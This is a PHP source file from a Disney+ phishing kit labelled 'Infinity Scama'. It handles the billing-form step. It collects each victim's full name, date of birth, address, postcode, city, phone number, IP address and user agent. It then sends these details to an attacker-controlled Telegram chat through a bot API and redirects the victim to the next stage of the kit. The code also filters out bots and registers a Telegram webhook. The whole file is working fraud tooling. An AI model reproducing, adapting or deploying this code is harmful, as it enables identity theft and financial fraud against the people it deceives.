<?php
session_start();

include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

if (empty($_SESSION['webhook_set'])) {
    $webhook_url = htmlspecialchars("https://{$_SERVER['HTTP_HOST']}/app/webhook.php");
    $ctx = stream_context_create(['http' => ['timeout' => 3, 'ignore_errors' => true]]);
    @file_get_contents("https://api.telegram.org/bot" . urlencode($telegram['token'])
        . "/setWebhook?url=" . urlencode($webhook_url), false, $ctx);
    $_SESSION['webhook_set'] = 1;
}

if (($_SESSION['bot'] ?? '') != '1') {
    header('Location: /site/index.html', true, 302);
    exit();
}

$_SESSION['ip'] = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) ?: ($_SERVER['REMOTE_ADDR'] ?? '');
$_SESSION['ua'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? '');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../../../index.php', true, 302);
    exit();
}

$fields = ['lname', 'fname', 'dob', 'address', 'zip', 'city', 'phone'];
$filled = array_filter($fields, fn($f) => !empty($_POST[$f]));

if (!$filled) {
    $_SESSION['billing-error'] = $errors['2'];
    header('Location: ../', true, 302);
    exit();
}

foreach ($fields as $f) {
    $_SESSION[$f] = htmlspecialchars($_POST[$f] ?? '');
}
$_SESSION['name'] = trim($_SESSION['lname'] . ' ' . $_SESSION['fname']);

$text = "
★━━━━━━ 👤 ━━━━━━★

👤 Nom complet ➟ {$_SESSION['name']}
👤 Date de naissance ➟ {$_SESSION['dob']}
👤 Adresse ➟ {$_SESSION['address']}
👤 Code postal ➟ {$_SESSION['zip']}
👤 Ville ➟ {$_SESSION['city']}
👤 Numéro de téléphone ➟ {$_SESSION['phone']}

★━━━━━━ 🌐 ━━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}

<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

if ($telegram['status'] == true) {
    sendMessage($telegram['RezChatId']['billing'], $text);
}

$_SESSION['load'] = !empty($settings['steps']['card']) ? ($_SESSION['id4'] ?? '') : ($_SESSION['id14'] ?? '');
$_SESSION['billing-error'] = "";
$_SESSION['billing'] = "1";

$root = dirname(__DIR__, 3);
$camp = basename(dirname(__DIR__, 2));
$next = $_SESSION['id5'] ?? '';
if ($next === '' || !is_dir($root . '/' . $camp . '/' . $next)) {
    $next = trim((string)@file_get_contents($root . '/id5.txt'));
}
session_write_close();

if ($next !== '' && is_dir($root . '/' . $camp . '/' . $next)) {
    header('Location: /' . $camp . '/' . rawurlencode($next) . '/', true, 302);
} else {
    header('Location: /index.php', true, 302);
}
exit();